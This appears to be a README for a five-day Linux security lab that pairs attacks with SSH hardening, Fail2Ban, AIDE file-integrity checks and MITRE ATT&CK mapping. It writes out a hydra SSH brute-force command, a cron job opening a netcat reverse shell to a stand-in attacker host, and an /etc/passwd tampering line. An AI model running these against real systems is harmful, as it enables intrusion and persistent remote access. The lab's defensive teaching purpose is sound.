# Linux Security Engineering Lab
Attack → Detect → Persist → Defend → Validate

--------------------------------------------------

## Overview

This project simulates a real-world Linux security lifecycle by combining
offensive and defensive security techniques in a controlled lab environment.

The objective is to demonstrate how a system can be:

- attacked by an adversary
- monitored through logs
- hardened with security controls
- compromised via persistence techniques
- defended using detection mechanisms
- validated against repeat attacks

This project reflects practical security engineering by bridging system
administration, detection engineering, and incident response.

--------------------------------------------------

## Objectives

- Simulate real-world attack techniques against a Linux system
- Analyze authentication and system logs for indicators of compromise
- Implement layered security controls (defense-in-depth)
- Detect persistence mechanisms used by attackers
- Monitor file integrity using host-based detection
- Validate effectiveness of security controls
- Map activity to MITRE ATT&CK techniques

--------------------------------------------------

## Lab Architecture

- Target System: Ubuntu Server
- Attacker System: Kali Linux
- Access Method: SSH
- Monitoring: Linux system logs
- Defense Tools: UFW, Fail2Ban
- Detection Tools: AIDE

--------------------------------------------------

## Tools & Technologies

- Ubuntu Server
- OpenSSH
- Hydra
- UFW (Firewall)
- Fail2Ban
- AIDE
- Netcat

--------------------------------------------------

## Project Structure

linux-security-lab/
│
├── setup/
├── attacks/
│   ├── brute-force.md
│   └── persistence.md
│
├── detection/
│   ├── log-analysis.md
│   └── fim-analysis.md
│
├── defense/
│   ├── firewall.md
│   └── fail2ban.md
│
├── validation/
│   └── results.md
│
├── audit/
│   └── lynis-report.md
│
├── screenshots/
│   ├── day1/
│   ├── day2/
│   ├── day3/
│   ├── day4/
│   └── day5/
│
└── README.md

--------------------------------------------------

## DAY 1 — System Setup + Logging Baseline

### Setup Steps

- Installed Ubuntu Server
- Created user: secureuser
- Enabled SSH access

Command:

sudo apt install openssh-server

### Logging

sudo tail -f /var/log/auth.log

### Screenshots

![SSH Login](screenshots/day1/ssh-login.png)
![Auth Log Entries](screenshots/day1/auth-log.png)

--------------------------------------------------

## DAY 2 — Attack + Log Analysis

### Brute Force Attack

hydra -l secureuser -P rockyou.txt ssh://<target-ip>

### Analysis

- Monitored /var/log/auth.log
- Identified repeated failed login attempts
- Extracted attacker IP and timestamps

### Screenshots

![Hydra Brute Force Attack](screenshots/day2/hydra-attack.png)

![Failed Login Attempts in Logs](screenshots/day2/failed-logins.png)

--------------------------------------------------

## DAY 3 — Hardening + Automated Defense

### Firewall Configuration

sudo ufw allow OpenSSH
sudo ufw enable

### Fail2Ban Installation

sudo apt install fail2ban

### Configuration

[sshd]
enabled = true
maxretry = 3
bantime = 600

### SSH Hardening

PermitRootLogin no

### Restart SSH

sudo systemctl restart ssh

### Screenshots

![Fail2Ban Status](screenshots/day3/fail2ban-status.png)
![Fail2Ban Config](screenshots/day3/fail2ban-config.png)

--------------------------------------------------

## DAY 4 — Persistence Attack + FIM

### Persistence Attack (Cron Job)

crontab -e

* * * * * nc attacker-ip 4444 -e /bin/bash

### Detection

crontab -l
ps aux

### Screenshots

![Cron Job](screenshots/day4/cron-job.png)
![Running Process](screenshots/day4/process.png)

--------------------------------------------------

## File Integrity Monitoring (AIDE)

### Install

sudo apt install aide
sudo aideinit

### Simulate Tampering

echo "malicious change" >> /etc/passwd

### Detection

sudo aide --check

### Screenshots

![AIDE Alert](screenshots/day4/aide-alert.png)

--------------------------------------------------

## DAY 5 — Validation + MITRE ATT&CK

### Re-run Attack

hydra -l secureuser -P rockyou.txt ssh://<target-ip>

### Results

- IP automatically banned
- Attack blocked

### Screenshots

![Blocked Attack](screenshots/day5/blocked.png)
![Fail2Ban Ban](screenshots/day5/fail2ban-ban.png)

--------------------------------------------------

## MITRE ATT&CK Mapping

Attack               Technique
Brute Force          T1110
Persistence (cron)   T1053
File tampering       T1565

--------------------------------------------------

## Before vs After

Control                 Before     After
SSH protection          none       Fail2Ban
File integrity          none       AIDE
Persistence detection   none       manual detection
Brute force defense     none       blocked

--------------------------------------------------

## Key Takeaways

- Simulated real-world attack scenarios
- Detected malicious behavior using logs
- Implemented layered security defenses
- Identified persistence mechanisms
- Verified effectiveness of controls

--------------------------------------------------

## Why This Project Matters

This is not just a hardening lab.

This project demonstrates a full security lifecycle:

- build
- attack
- detect
- defend
- validate

This aligns with real-world cybersecurity roles in:

- SOC Operations
- Detection Engineering
- Blue Team Security
- Security Engineering

--------------------------------------------------

## Future Improvements

- Integrate SIEM (Splunk)
- Add alerting mechanisms
- Centralize logging
- Simulate advanced attacks (privilege escalation, lateral movement)


